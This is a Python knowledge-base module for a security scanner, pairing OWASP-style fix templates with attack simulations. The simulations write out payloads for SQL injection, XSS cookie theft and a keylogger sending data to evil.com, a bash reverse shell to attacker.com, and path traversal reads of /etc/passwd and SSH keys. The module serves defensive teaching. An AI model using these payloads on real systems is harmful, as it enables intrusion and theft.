"""
Static knowledge base for vulnerability fixes and attack simulations.
No LLM required - all data is pre-written based on OWASP, CWE, and security research.
"""

FIXES = {
    "SQL_INJECTION": {
        "vulnerable_code": "query = 'SELECT * FROM users WHERE id = ' + user_id",
        "fixed_code": (
            "# Use parameterized queries / prepared statements\n"
            "query = 'SELECT * FROM users WHERE id = ?'\n"
            "cursor.execute(query, (user_id,))\n\n"
            "# OR with named parameters (SQLAlchemy / ORM)\n"
            "user = User.query.filter_by(id=user_id).first()"
        ),
        "explanation": (
            "SQL Injection occurs when user-supplied data is concatenated directly into SQL queries, "
            "allowing attackers to alter query logic. The fix is to use parameterized queries (prepared statements) "
            "where user input is treated as data, not SQL code. The database driver handles escaping automatically."
        ),
        "additional_notes": (
            "Also consider: using an ORM (SQLAlchemy, Hibernate, ActiveRecord) which uses parameterized queries by default; "
            "applying the principle of least privilege to database accounts; "
            "enabling WAF rules for SQL injection patterns."
        ),
    },
    "XSS": {
        "vulnerable_code": "element.innerHTML = userInput;",
        "fixed_code": (
            "// Use textContent instead of innerHTML for plain text\n"
            "element.textContent = userInput;\n\n"
            "// OR encode output in templates (e.g., React JSX auto-escapes)\n"
            "return <div>{userInput}</div>;\n\n"
            "// For server-side rendering, use a templating engine that auto-escapes\n"
            "// e.g., Jinja2: {{ user_input }} (auto-escaped by default)"
        ),
        "explanation": (
            "Cross-Site Scripting (XSS) occurs when untrusted data is inserted into web pages without proper encoding, "
            "allowing attackers to execute scripts in victims' browsers. "
            "The fix is to encode output based on context: HTML encoding for HTML content, "
            "JavaScript encoding for JS contexts, URL encoding for URLs."
        ),
        "additional_notes": (
            "Also apply: Content Security Policy (CSP) headers; "
            "X-XSS-Protection header; "
            "use DOMPurify for rich text that needs HTML; "
            "avoid eval(), document.write(), and innerHTML with user data."
        ),
    },
    "COMMAND_INJECTION": {
        "vulnerable_code": "os.system('ping ' + hostname)",
        "fixed_code": (
            "import subprocess\n\n"
            "# Use subprocess with a list (avoids shell interpretation)\n"
            "result = subprocess.run(\n"
            "    ['ping', '-c', '4', hostname],\n"
            "    capture_output=True, text=True, timeout=10\n"
            ")\n\n"
            "# Validate input against an allowlist before use\n"
            "import re\n"
            "if not re.match(r'^[a-zA-Z0-9._-]+$', hostname):\n"
            "    raise ValueError('Invalid hostname')"
        ),
        "explanation": (
            "Command Injection occurs when user input is passed to a shell command without sanitization, "
            "allowing attackers to run arbitrary OS commands. "
            "The fix is to avoid shell=True and pass arguments as a list to subprocess, "
            "or to validate input against a strict allowlist of permitted values."
        ),
        "additional_notes": (
            "Never use os.system(), os.popen(), or subprocess with shell=True with user input. "
            "Consider using language-specific APIs instead of shelling out (e.g., Python's socket library instead of ping). "
            "Run processes with minimum required privileges."
        ),
    },
    "PATH_TRAVERSAL": {
        "vulnerable_code": "open('/var/www/files/' + filename).read()",
        "fixed_code": (
            "import os\n\n"
            "BASE_DIR = '/var/www/files/'\n\n"
            "# Resolve and validate the final path\n"
            "safe_path = os.path.realpath(os.path.join(BASE_DIR, filename))\n"
            "if not safe_path.startswith(os.path.realpath(BASE_DIR)):\n"
            "    raise ValueError('Access denied: path traversal detected')\n\n"
            "with open(safe_path) as f:\n"
            "    content = f.read()"
        ),
        "explanation": (
            "Path Traversal occurs when user-controlled file paths are not sanitized, "
            "allowing attackers to access files outside the intended directory (e.g., ../../etc/passwd). "
            "The fix is to resolve the full canonical path with os.path.realpath() and verify it starts with the intended base directory."
        ),
        "additional_notes": (
            "Also consider: using UUIDs or indirect references instead of filenames; "
            "storing files with server-generated names; "
            "running the application with read-only access to only necessary directories."
        ),
    },
    "SSRF": {
        "vulnerable_code": "requests.get(url)  # url from user input",
        "fixed_code": (
            "from urllib.parse import urlparse\n"
            "import ipaddress\n\n"
            "ALLOWED_DOMAINS = {'api.example.com', 'cdn.example.com'}\n\n"
            "def safe_fetch(url: str):\n"
            "    parsed = urlparse(url)\n"
            "    if parsed.scheme not in ('http', 'https'):\n"
            "        raise ValueError('Only HTTP/HTTPS allowed')\n"
            "    if parsed.hostname not in ALLOWED_DOMAINS:\n"
            "        raise ValueError('Domain not in allowlist')\n"
            "    # Block private/loopback IPs\n"
            "    try:\n"
            "        ip = ipaddress.ip_address(parsed.hostname)\n"
            "        if ip.is_private or ip.is_loopback:\n"
            "            raise ValueError('Private IPs not allowed')\n"
            "    except ValueError:\n"
            "        pass  # hostname, not IP\n"
            "    return requests.get(url, timeout=5)"
        ),
        "explanation": (
            "Server-Side Request Forgery (SSRF) occurs when the server fetches a URL supplied by the user, "
            "allowing attackers to access internal services, cloud metadata endpoints (169.254.169.254), or other internal resources. "
            "The fix is to validate URLs against an allowlist of permitted domains and block requests to private IP ranges."
        ),
        "additional_notes": (
            "Also consider: deploying in a network with egress filtering; "
            "disabling unnecessary URL schemes (file://, dict://, gopher://); "
            "using a dedicated HTTP proxy that enforces allowlists."
        ),
    },
    "XXE": {
        "vulnerable_code": "etree.parse(user_xml)",
        "fixed_code": (
            "from lxml import etree\n\n"
            "# Disable external entity processing\n"
            "parser = etree.XMLParser(\n"
            "    resolve_entities=False,\n"
            "    no_network=True,\n"
            "    load_dtd=False,\n"
            ")\n"
            "tree = etree.parse(user_xml, parser)\n\n"
            "# OR use defusedxml (Python drop-in replacement)\n"
            "import defusedxml.ElementTree as ET\n"
            "tree = ET.parse(user_xml)"
        ),
        "explanation": (
            "XML External Entity (XXE) injection occurs when XML parsers process external entity references, "
            "allowing attackers to read local files, perform SSRF, or cause DoS. "
            "The fix is to disable DTD processing and external entity resolution in the XML parser."
        ),
        "additional_notes": (
            "Use defusedxml for Python, FEATURE_SECURE_PROCESSING for Java's SAXParser, "
            "or JSON instead of XML where possible. "
            "Never process XML from untrusted sources with default parser settings."
        ),
    },
    "CSRF": {
        "vulnerable_code": "<form action='/transfer' method='POST'>...</form>",
        "fixed_code": (
            "# Server: generate and validate CSRF token\n"
            "from secrets import token_urlsafe\n\n"
            "# In session: session['csrf_token'] = token_urlsafe(32)\n\n"
            "# In form:\n"
            "# <input type='hidden' name='csrf_token' value='{{ session.csrf_token }}'>\n\n"
            "# On POST: validate\n"
            "if request.form['csrf_token'] != session['csrf_token']:\n"
            "    abort(403)\n\n"
            "# Modern frameworks: use built-in CSRF protection\n"
            "# Django: {% csrf_token %}\n"
            "# Flask-WTF: FlaskForm includes CSRF by default\n"
            "# Express: csurf middleware"
        ),
        "explanation": (
            "Cross-Site Request Forgery (CSRF) tricks authenticated users into submitting requests to a site they're logged into. "
            "The fix is to include a secret, unpredictable CSRF token in every state-changing form/request, "
            "and verify it on the server. Tokens must be unique per session and per request (double-submit pattern)."
        ),
        "additional_notes": (
            "Also use: SameSite=Strict or SameSite=Lax cookie attribute; "
            "verify Origin/Referer headers; "
            "use CORS properly; "
            "require re-authentication for sensitive operations."
        ),
    },
    "INSECURE_DESERIALIZATION": {
        "vulnerable_code": "obj = pickle.loads(user_data)",
        "fixed_code": (
            "import json\n\n"
            "# Use JSON (safe) instead of pickle for user data\n"
            "obj = json.loads(user_data)  # only parses data, no code\n\n"
            "# If you must deserialize complex objects, use a schema validator:\n"
            "from pydantic import BaseModel\n"
            "class SafeData(BaseModel):\n"
            "    name: str\n"
            "    value: int\n"
            "obj = SafeData.model_validate_json(user_data)\n\n"
            "# Never use pickle, marshal, or yaml.load() on untrusted data"
        ),
        "explanation": (
            "Insecure Deserialization allows attackers to craft malicious serialized objects "
            "that execute arbitrary code when deserialized. Python's pickle, Java's ObjectInputStream, "
            "and PHP's unserialize() are common targets. "
            "The fix is to use safe data formats like JSON with schema validation."
        ),
        "additional_notes": (
            "If deserialization of complex types is required, use: "
            "cryptographic signatures to verify integrity before deserializing; "
            "allowlists of permitted classes (Java: SerialKiller, Python: restricted unpickler); "
            "sandboxed deserialization environments."
        ),
    },
    "HARDCODED_SECRET": {
        "vulnerable_code": "SECRET_KEY = 'abc123supersecret'",
        "fixed_code": (
            "import os\n"
            "from dotenv import load_dotenv\n\n"
            "load_dotenv()  # loads from .env file (not committed to git)\n\n"
            "SECRET_KEY = os.environ.get('SECRET_KEY')\n"
            "if not SECRET_KEY:\n"
            "    raise RuntimeError('SECRET_KEY environment variable not set')\n\n"
            "# .env file (add to .gitignore!):\n"
            "# SECRET_KEY=your-random-secret-here\n\n"
            "# Generate strong secret: python -c \"import secrets; print(secrets.token_hex(32))\""
        ),
        "explanation": (
            "Hardcoded secrets (API keys, passwords, tokens) in source code are exposed when code is shared, "
            "committed to version control, or decompiled. "
            "The fix is to store secrets in environment variables or a secrets manager (AWS Secrets Manager, HashiCorp Vault), "
            "loaded at runtime."
        ),
        "additional_notes": (
            "If a secret was committed: rotate it immediately, then remove it from git history using git-filter-repo. "
            "Use pre-commit hooks (git-secrets, detect-secrets, truffleHog) to prevent accidental commits. "
            "Add .env to .gitignore."
        ),
    },
    "WEAK_CRYPTOGRAPHY": {
        "vulnerable_code": "hashlib.md5(password.encode()).hexdigest()",
        "fixed_code": (
            "import bcrypt\n\n"
            "# For passwords: use bcrypt, argon2, or scrypt\n"
            "hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))\n\n"
            "# Verify:\n"
            "if bcrypt.checkpw(input_password.encode(), hashed):\n"
            "    print('Password matches')\n\n"
            "# For general data integrity (not passwords): use SHA-256 or SHA-3\n"
            "import hashlib\n"
            "digest = hashlib.sha256(data).hexdigest()"
        ),
        "explanation": (
            "MD5 and SHA-1 are cryptographically broken: they are fast (making brute-force easy) "
            "and vulnerable to collision attacks. "
            "For passwords, use slow adaptive hashing functions (bcrypt, argon2id, scrypt) "
            "that are designed to be computationally expensive. "
            "For data integrity, use SHA-256 or SHA-3."
        ),
        "additional_notes": (
            "Never use MD5 or SHA-1 for security purposes. "
            "For encryption, use AES-256-GCM (authenticated encryption). "
            "Use the cryptography library (Python) or libsodium instead of implementing crypto yourself."
        ),
    },
    "OPEN_REDIRECT": {
        "vulnerable_code": "return redirect(request.args.get('next'))",
        "fixed_code": (
            "from urllib.parse import urlparse\n\n"
            "ALLOWED_HOSTS = {'example.com', 'app.example.com'}\n\n"
            "def safe_redirect(url: str):\n"
            "    parsed = urlparse(url)\n"
            "    # Only allow relative URLs or trusted hosts\n"
            "    if parsed.netloc and parsed.netloc not in ALLOWED_HOSTS:\n"
            "        return redirect('/')  # default safe URL\n"
            "    return redirect(url)\n\n"
            "next_url = request.args.get('next', '/')\n"
            "return safe_redirect(next_url)"
        ),
        "explanation": (
            "Open Redirect allows attackers to redirect users to malicious sites via a trusted URL, "
            "enabling phishing attacks. The fix is to validate redirect targets against an allowlist "
            "of trusted domains, or only allow relative URLs (no protocol/hostname)."
        ),
        "additional_notes": (
            "Prefer using indirect references (e.g., redirect_to=dashboard) mapped server-side to URLs. "
            "Never trust user-supplied URLs for redirects without validation."
        ),
    },
    "CORS_MISCONFIGURATION": {
        "vulnerable_code": "Access-Control-Allow-Origin: *  # with credentials",
        "fixed_code": (
            "# Whitelist specific trusted origins\n"
            "ALLOWED_ORIGINS = ['https://app.example.com', 'https://admin.example.com']\n\n"
            "# FastAPI example:\n"
            "from fastapi.middleware.cors import CORSMiddleware\n"
            "app.add_middleware(\n"
            "    CORSMiddleware,\n"
            "    allow_origins=ALLOWED_ORIGINS,  # NOT ['*']\n"
            "    allow_credentials=True,\n"
            "    allow_methods=['GET', 'POST'],\n"
            "    allow_headers=['Authorization', 'Content-Type'],\n"
            ")"
        ),
        "explanation": (
            "Overly permissive CORS (Access-Control-Allow-Origin: *) combined with credentials "
            "allows malicious sites to make authenticated requests to your API. "
            "The fix is to specify an explicit allowlist of trusted origins and validate each request's Origin header."
        ),
        "additional_notes": (
            "Note: Access-Control-Allow-Origin: * with credentials is rejected by browsers, "
            "but dynamic reflection of the Origin header without validation is equally dangerous. "
            "Regularly audit your CORS configuration."
        ),
    },
    "PROTOTYPE_POLLUTION": {
        "vulnerable_code": "obj[key] = value;  // key could be '__proto__'",
        "fixed_code": (
            "// Check for dangerous keys before assignment\n"
            "const FORBIDDEN_KEYS = ['__proto__', 'constructor', 'prototype'];\n\n"
            "function safeSet(obj, key, value) {\n"
            "  if (FORBIDDEN_KEYS.includes(key)) {\n"
            "    throw new Error('Prototype pollution attempt blocked');\n"
            "  }\n"
            "  obj[key] = value;\n"
            "}\n\n"
            "// OR use Object.create(null) for maps with no prototype\n"
            "const safeMap = Object.create(null);\n"
            "safeMap[userKey] = userValue;  // no prototype to pollute"
        ),
        "explanation": (
            "Prototype Pollution allows attackers to modify JavaScript's Object.prototype, "
            "affecting all objects and potentially enabling RCE or privilege escalation. "
            "The fix is to block assignments to __proto__, constructor, and prototype keys, "
            "or use Object.create(null) for dictionaries."
        ),
        "additional_notes": (
            "Use the lodash.merge or similar utility's latest patched versions. "
            "Consider using TypeScript with strict null checks. "
            "Use JSON schema validation on user-supplied objects before merging."
        ),
    },
    "CODE_INJECTION": {
        "vulnerable_code": "eval(user_code)",
        "fixed_code": (
            "# Never use eval() on user input\n"
            "# Replace with a safe alternative:\n\n"
            "# For math expressions:\n"
            "import ast\n"
            "def safe_eval_math(expr: str) -> float:\n"
            "    tree = ast.parse(expr, mode='eval')\n"
            "    allowed = (ast.Expression, ast.BinOp, ast.UnaryOp,\n"
            "               ast.Num, ast.Constant, ast.operator, ast.unaryop)\n"
            "    if not all(isinstance(node, allowed) for node in ast.walk(tree)):\n"
            "        raise ValueError('Invalid expression')\n"
            "    return eval(compile(tree, '<expr>', 'eval'))\n\n"
            "# For dynamic logic, use a whitelist of predefined functions"
        ),
        "explanation": (
            "Code Injection through eval() or exec() with user input allows arbitrary code execution. "
            "The fix is to never use eval() on untrusted data. "
            "For math expressions, use ast.parse() with a whitelist of allowed node types. "
            "For dynamic behavior, map user input to predefined safe functions."
        ),
        "additional_notes": (
            "Also avoid: exec(), __import__(), compile() on user input; "
            "template engines with unsafe modes (Jinja2 with autoescape=False); "
            "JavaScript's Function() constructor and setTimeout/setInterval with strings."
        ),
    },
    "SECURITY_VULNERABILITY": {
        "vulnerable_code": "# See the identified code snippet",
        "fixed_code": (
            "# General security hardening:\n"
            "# 1. Validate and sanitize all user inputs\n"
            "# 2. Use parameterized queries for database operations\n"
            "# 3. Encode output based on context (HTML, JS, URL)\n"
            "# 4. Apply principle of least privilege\n"
            "# 5. Use up-to-date libraries and frameworks\n"
            "# 6. Enable security headers (CSP, HSTS, X-Frame-Options)\n"
            "# 7. Implement proper error handling (no stack traces to users)\n"
            "# 8. Use HTTPS everywhere"
        ),
        "explanation": (
            "A security vulnerability was detected by static analysis. "
            "Review the flagged code snippet and the rule description carefully. "
            "Apply the principle of least privilege, validate all inputs, "
            "and use established security libraries rather than custom implementations."
        ),
        "additional_notes": (
            "Consult OWASP guidelines (owasp.org) and the specific CWE entry for detailed remediation advice. "
            "Consider a professional security review for critical systems."
        ),
    },
}

# Fallback for unknown types
for _key in ["MISSING_SECURITY_HEADERS", "BROKEN_AUTHENTICATION", "INSUFFICIENT_LOGGING",
             "ERROR_HANDLING", "INJECTION", "REDOS"]:
    FIXES[_key] = FIXES["SECURITY_VULNERABILITY"]


SIMULATIONS = {
    "SQL_INJECTION": {
        "attack_vector": "Attacker injects malicious SQL via form fields, URL parameters, or API inputs that are concatenated into SQL queries.",
        "prerequisites": [
            "Application uses dynamic SQL string concatenation",
            "Error messages reveal database structure (or blind injection is feasible)",
            "Network access to the web application",
        ],
        "steps": [
            {
                "step": 1,
                "action": "Probe for SQL injection point",
                "payload": "' OR '1'='1",
                "result": "Application returns all rows or behaves differently, confirming injection.",
            },
            {
                "step": 2,
                "action": "Enumerate database columns with UNION",
                "payload": "' UNION SELECT NULL, NULL, NULL--",
                "result": "Application returns combined results; attacker determines column count.",
            },
            {
                "step": 3,
                "action": "Extract database version and schema",
                "payload": "' UNION SELECT table_name, NULL FROM information_schema.tables--",
                "result": "List of all database tables returned to attacker.",
            },
            {
                "step": 4,
                "action": "Dump sensitive data",
                "payload": "' UNION SELECT username, password FROM users--",
                "result": "Usernames and hashed/plaintext passwords extracted.",
            },
            {
                "step": 5,
                "action": "Bypass authentication",
                "payload": "admin' --",
                "result": "Login succeeds without valid password; admin access granted.",
            },
        ],
        "impact": "Full database read/write access, authentication bypass, potential OS command execution (via xp_cmdshell on MSSQL), data exfiltration, data destruction.",
        "real_world_example": "CVE-2012-2122 (MySQL authentication bypass), Heartland Payment Systems breach (2008) - largest credit card theft at the time via SQL injection.",
        "detection_methods": [
            "Web Application Firewall (WAF) alerts on SQL keywords in inputs",
            "Anomalous database query patterns in DB logs",
            "IDS/IPS signatures for SQL injection payloads",
            "Application error monitoring for SQL syntax errors",
        ],
        "prevention_tips": [
            "Use parameterized queries or prepared statements exclusively",
            "Apply ORM frameworks that handle escaping automatically",
            "Validate and sanitize all user inputs with allowlists",
            "Apply least privilege to database accounts (no DROP/ALTER)",
            "Enable database-level audit logging",
        ],
    },
    "XSS": {
        "attack_vector": "Attacker injects malicious JavaScript into web pages that is rendered by other users' browsers.",
        "prerequisites": [
            "Application reflects user input in HTML without encoding",
            "Victim is authenticated or has valuable session cookies",
            "Attacker can lure victim to a crafted URL (reflected) or the page itself stores the payload (stored)",
        ],
        "steps": [
            {
                "step": 1,
                "action": "Find a reflection point",
                "payload": "<script>alert('XSS')</script>",
                "result": "Alert box appears, confirming script execution in the browser.",
            },
            {
                "step": 2,
                "action": "Steal session cookie",
                "payload": "<script>document.location='https://evil.com/steal?c='+document.cookie</script>",
                "result": "Victim's session cookie is sent to attacker's server.",
            },
            {
                "step": 3,
                "action": "Perform actions on behalf of victim",
                "payload": "<script>fetch('/api/transfer',{method:'POST',body:JSON.stringify({to:'attacker',amount:1000})})</script>",
                "result": "Money transferred from victim's account without their knowledge.",
            },
            {
                "step": 4,
                "action": "Deploy keylogger",
                "payload": "<script>document.onkeypress=e=>fetch('https://evil.com/?k='+e.key)</script>",
                "result": "All keystrokes (including passwords) sent to attacker.",
            },
        ],
        "impact": "Session hijacking, credential theft, account takeover, malware distribution, defacement, phishing within trusted domain.",
        "real_world_example": "Samy worm (2005) - first XSS worm, infected 1 million MySpace profiles in 20 hours. British Airways breach (2018) - card skimming via XSS.",
        "detection_methods": [
            "Content Security Policy (CSP) violation reports",
            "WAF alerts on script tags in inputs",
            "Browser XSS auditors (legacy) / Trusted Types API",
            "User reports of unexpected behavior",
        ],
        "prevention_tips": [
            "Encode all output based on context (HTML, JS, URL, CSS)",
            "Implement a strict Content Security Policy (CSP)",
            "Use modern frameworks (React, Angular) that auto-escape",
            "Set HttpOnly and Secure flags on session cookies",
            "Use DOMPurify for sanitizing rich text HTML",
        ],
    },
    "COMMAND_INJECTION": {
        "attack_vector": "Attacker injects OS commands via user-controlled input passed to shell execution functions.",
        "prerequisites": [
            "Application executes shell commands with user-supplied data",
            "Shell interpretation is enabled (shell=True or similar)",
        ],
        "steps": [
            {
                "step": 1,
                "action": "Test for command injection",
                "payload": "127.0.0.1; id",
                "result": "Output includes 'uid=33(www-data)' confirming code execution.",
            },
            {
                "step": 2,
                "action": "Explore the filesystem",
                "payload": "127.0.0.1; ls /etc",
                "result": "Directory listing of /etc shown, revealing configuration files.",
            },
            {
                "step": 3,
                "action": "Read sensitive files",
                "payload": "127.0.0.1; cat /etc/passwd",
                "result": "System user list extracted.",
            },
            {
                "step": 4,
                "action": "Establish reverse shell",
                "payload": "127.0.0.1; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
                "result": "Attacker gets interactive shell on the server.",
            },
        ],
        "impact": "Full server compromise, data exfiltration, ransomware deployment, pivoting to internal network.",
        "real_world_example": "Shellshock (CVE-2014-6271) - Bash command injection via environment variables affected millions of servers.",
        "detection_methods": [
            "Monitor for unexpected child process spawning from web server",
            "Auditd rules for shell execution by web server user",
            "SIEM alerts on outbound connections from web server",
            "WAF rules for shell metacharacters (;, |, &&, `)",
        ],
        "prevention_tips": [
            "Use subprocess with argument lists (not shell=True)",
            "Validate inputs against strict allowlists",
            "Use language-specific APIs instead of shelling out",
            "Run application with minimal OS privileges (non-root)",
            "Use containerization to limit blast radius",
        ],
    },
    "PATH_TRAVERSAL": {
        "attack_vector": "Attacker manipulates file path parameters with ../ sequences to access files outside the intended directory.",
        "prerequisites": [
            "Application reads files based on user-supplied paths",
            "No path canonicalization or boundary checking",
        ],
        "steps": [
            {
                "step": 1,
                "action": "Test traversal with basic sequence",
                "payload": "../../../../etc/passwd",
                "result": "System user list returned, confirming traversal vulnerability.",
            },
            {
                "step": 2,
                "action": "Read application secrets",
                "payload": "../../../../var/www/html/.env",
                "result": "Database credentials and API keys exposed.",
            },
            {
                "step": 3,
                "action": "Read SSH keys",
                "payload": "../../../../root/.ssh/id_rsa",
                "result": "Root SSH private key extracted, enabling server login.",
            },
            {
                "step": 4,
                "action": "Read application source code",
                "payload": "../../../../var/www/html/app.py",
                "result": "Source code revealed, exposing additional vulnerabilities.",
            },
        ],
        "impact": "Arbitrary file read, source code disclosure, credential theft, potential code execution via log poisoning or config file manipulation.",
        "real_world_example": "CVE-2021-41773 (Apache HTTP Server) - path traversal and RCE in Apache 2.4.49, exploited within days of disclosure.",
        "detection_methods": [
            "WAF rules detecting ../ patterns in request parameters",
            "File system audit logs for access outside web root",
            "Application logs for unusual file path patterns",
        ],
        "prevention_tips": [
            "Canonicalize paths with realpath() and validate against base directory",
            "Use UUIDs or indirect references instead of file names",
            "Restrict file system permissions: web server should not read /etc, /root, etc.",
            "Use chroot or containers to isolate the application",
        ],
    },
    "SSRF": {
        "attack_vector": "Attacker provides a malicious URL that causes the server to make requests to internal services or cloud metadata endpoints.",
        "prerequisites": [
            "Server fetches content from user-supplied URLs",
            "No URL validation or network segmentation",
        ],
        "steps": [
            {
                "step": 1,
                "action": "Test SSRF to attacker's server",
                "payload": "http://attacker.com/ssrf-test",
                "result": "Attacker server receives request from the target server's IP.",
            },
            {
                "step": 2,
                "action": "Probe internal network",
                "payload": "http://192.168.1.1/",
                "result": "Internal router admin panel HTML returned.",
            },
            {
                "step": 3,
                "action": "Access cloud metadata",
                "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "result": "AWS IAM role credentials (access key, secret, token) exposed.",
            },
            {
                "step": 4,
                "action": "Enumerate internal services",
                "payload": "http://localhost:6379/",
                "result": "Redis server response confirms internal cache service.",
            },
        ],
        "impact": "Cloud credential theft (AWS/GCP/Azure metadata), internal service access, port scanning, data exfiltration from internal APIs.",
        "real_world_example": "Capital One breach (2019) - SSRF to AWS metadata endpoint led to IAM credential theft and 100 million customer records exposure.",
        "detection_methods": [
            "Network egress monitoring for unexpected outbound requests",
            "Cloud security tools detecting metadata endpoint access",
            "Application logs for unusual URL patterns",
            "WAF rules blocking private IP ranges in URL parameters",
        ],
        "prevention_tips": [
            "Validate URLs against allowlists of trusted domains",
            "Block requests to private IP ranges and metadata endpoints",
            "Use a dedicated HTTP proxy with egress filtering",
            "Apply network segmentation (application servers cannot reach internal services)",
            "Use IMDSv2 (token-required) for AWS metadata",
        ],
    },
    "HARDCODED_SECRET": {
        "attack_vector": "Attacker extracts hardcoded secrets from source code repositories, compiled binaries, or deployed files.",
        "prerequisites": [
            "Source code accessible (public repo, leaked, or obtained via other vulnerability)",
            "Secrets not rotated after exposure",
        ],
        "steps": [
            {
                "step": 1,
                "action": "Search public repositories",
                "payload": "site:github.com 'SECRET_KEY = ' 'example.com'",
                "result": "Found hardcoded API key or database password in public repo.",
            },
            {
                "step": 2,
                "action": "Search git history",
                "payload": "git log --all -p | grep -i 'password\\|secret\\|key'",
                "result": "Historical commit reveals secret even after deletion from latest code.",
            },
            {
                "step": 3,
                "action": "Use secret to authenticate",
                "payload": "curl -H 'Authorization: Bearer <extracted_token>' https://api.example.com/admin",
                "result": "Full API access granted with admin privileges.",
            },
        ],
        "impact": "Unauthorized API access, database breach, impersonation, billing fraud (cloud keys), full account takeover.",
        "real_world_example": "Uber breach (2022) - hardcoded credentials in internal tools led to access to AWS S3 buckets. Toyota (2023) - hardcoded access key in public GitHub for 5 years.",
        "detection_methods": [
            "git-secrets, truffleHog, or detect-secrets in CI/CD pipeline",
            "Regular automated scanning of repositories",
            "GitHub secret scanning (built-in for public repos)",
            "SIEM alerts for credential usage from unexpected IPs",
        ],
        "prevention_tips": [
            "Store secrets in environment variables or secrets managers (Vault, AWS Secrets Manager)",
            "Use pre-commit hooks to block secret commits",
            "Rotate exposed secrets immediately",
            "Remove secrets from git history with git-filter-repo",
            "Regularly audit all credentials and their usage",
        ],
    },
    "WEAK_CRYPTOGRAPHY": {
        "attack_vector": "Attacker cracks weakly hashed passwords using precomputed rainbow tables or GPU-accelerated brute force.",
        "prerequisites": [
            "Password hashes extracted from database (via SQLi or breach)",
            "Hashes use MD5, SHA-1, or unsalted SHA-256",
        ],
        "steps": [
            {
                "step": 1,
                "action": "Extract password hashes",
                "payload": "' UNION SELECT username, password_hash FROM users--",
                "result": "List of username:hash pairs extracted from database.",
            },
            {
                "step": 2,
                "action": "Check against known hash databases",
                "payload": "5f4dcc3b5aa765d61d8327deb882cf99 → 'password'",
                "result": "MD5 of common passwords immediately cracked via lookup tables.",
            },
            {
                "step": 3,
                "action": "GPU-accelerated cracking",
                "payload": "hashcat -m 0 hashes.txt rockyou.txt",
                "result": "~14 billion MD5 hashes/second on modern GPU; most passwords cracked in minutes.",
            },
        ],
        "impact": "Mass account compromise, credential stuffing attacks against other services, identity theft.",
        "real_world_example": "LinkedIn breach (2012) - 117 million unsalted SHA-1 hashes cracked. RockYou breach (2009) - 32 million plaintext passwords, now used as standard wordlist.",
        "detection_methods": [
            "Monitor for bulk login attempts (credential stuffing)",
            "Alert on impossible travel (login from two distant locations)",
            "HIBP (HaveIBeenPwned) integration for user notification",
        ],
        "prevention_tips": [
            "Use bcrypt (cost 12+), argon2id, or scrypt for password hashing",
            "Never use MD5 or SHA-1 for security purposes",
            "Use unique random salts per password (handled automatically by bcrypt)",
            "Implement account lockout and MFA",
            "Consider PBKDF2 if FIPS compliance is required",
        ],
    },
    "SECURITY_VULNERABILITY": {
        "attack_vector": "Attacker exploits the detected security weakness to gain unauthorized access or cause damage.",
        "prerequisites": [
            "Vulnerability exists in deployed application",
            "Attacker has network access to the application",
        ],
        "steps": [
            {
                "step": 1,
                "action": "Reconnaissance",
                "payload": "Manual or automated scanning to identify the vulnerability",
                "result": "Vulnerability confirmed and attack vector established.",
            },
            {
                "step": 2,
                "action": "Exploitation",
                "payload": "Craft payload targeting the specific vulnerability",
                "result": "Unauthorized access or functionality achieved.",
            },
            {
                "step": 3,
                "action": "Post-exploitation",
                "payload": "Leverage initial access for further compromise",
                "result": "Data exfiltration, persistence, or lateral movement.",
            },
        ],
        "impact": "Depends on vulnerability type: data breach, account takeover, service disruption, or full system compromise.",
        "real_world_example": "Refer to OWASP Top 10 and the specific CWE entry for documented real-world cases.",
        "detection_methods": [
            "Application and server log monitoring",
            "Intrusion detection systems (IDS/IPS)",
            "Security information and event management (SIEM)",
            "Web Application Firewall (WAF) alerts",
        ],
        "prevention_tips": [
            "Apply the specific fix recommended for this vulnerability type",
            "Conduct regular security code reviews",
            "Perform penetration testing before production deployment",
            "Keep all dependencies updated",
            "Follow OWASP Secure Coding Practices",
        ],
    },
}

# Aliases
for _key in ["MISSING_SECURITY_HEADERS", "BROKEN_AUTHENTICATION", "INSUFFICIENT_LOGGING",
             "ERROR_HANDLING", "INJECTION", "REDOS", "OPEN_REDIRECT", "CSRF",
             "INSECURE_DESERIALIZATION", "PROTOTYPE_POLLUTION", "CODE_INJECTION",
             "CORS_MISCONFIGURATION"]:
    if _key not in SIMULATIONS:
        SIMULATIONS[_key] = SIMULATIONS["SECURITY_VULNERABILITY"]


def get_fix(code: str, vulnerability_type: str, description: str, affected_lines: list) -> dict:
    """Return a fix from the knowledge base, with vulnerable code extracted from source."""
    template = FIXES.get(vulnerability_type, FIXES["SECURITY_VULNERABILITY"])

    # Extract the actual vulnerable snippet from the code using affected_lines
    lines = code.splitlines()
    if affected_lines:
        snippet_lines = []
        for ln in affected_lines:
            idx = ln - 1
            if 0 <= idx < len(lines):
                snippet_lines.append(lines[idx])
        vulnerable_code = "\n".join(snippet_lines) if snippet_lines else template["vulnerable_code"]
    else:
        vulnerable_code = template["vulnerable_code"]

    return {
        "vulnerable_code": vulnerable_code,
        "fixed_code": template["fixed_code"],
        "explanation": template["explanation"],
        "additional_notes": template["additional_notes"],
    }


def get_simulation(vulnerability_type: str, vulnerability_title: str,
                   code_snippet: str, description: str) -> dict:
    """Return a simulation scenario from the knowledge base."""
    return SIMULATIONS.get(vulnerability_type, SIMULATIONS["SECURITY_VULNERABILITY"])
